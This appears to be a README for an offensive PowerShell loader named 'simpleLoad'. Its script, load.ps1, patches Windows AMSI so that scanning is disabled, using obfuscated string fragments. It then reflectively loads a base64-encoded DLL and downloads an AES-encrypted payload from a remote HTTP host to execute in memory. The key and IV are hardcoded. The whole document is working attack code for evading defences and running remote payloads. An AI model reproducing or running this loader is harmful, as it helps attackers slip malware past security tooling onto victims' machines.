# simpleLoad
Compile it as 32bit architecture, copy the base64 dll to $encodeStr

```bash
$ cat simpleLoad.dll | xclip -sel c
```

load.ps1
```
# https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
#
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
$o = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
$t = [TrollAMSI].GetMethods() | Where-Object Name -eq 'M'
#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)
#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($o.MethodHandle)
[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)

$encodeStr = "xxxxxxxxxxxxxxxx"

$decodeStr = [System.Convert]::FromBase64String($encodeStr)
[System.Reflection.Assembly]::Load($decodeStr)
$url = "http://192.168.49.53/encrypted.bin"
$AESKey = "D(G+KbPeShVmYq3t"
$AESIV = "8y/B?E(G+KbPeShV"

[simpleLoad.Program]::DownloadAndExecute($url, $AESKey, $AESIV)
```
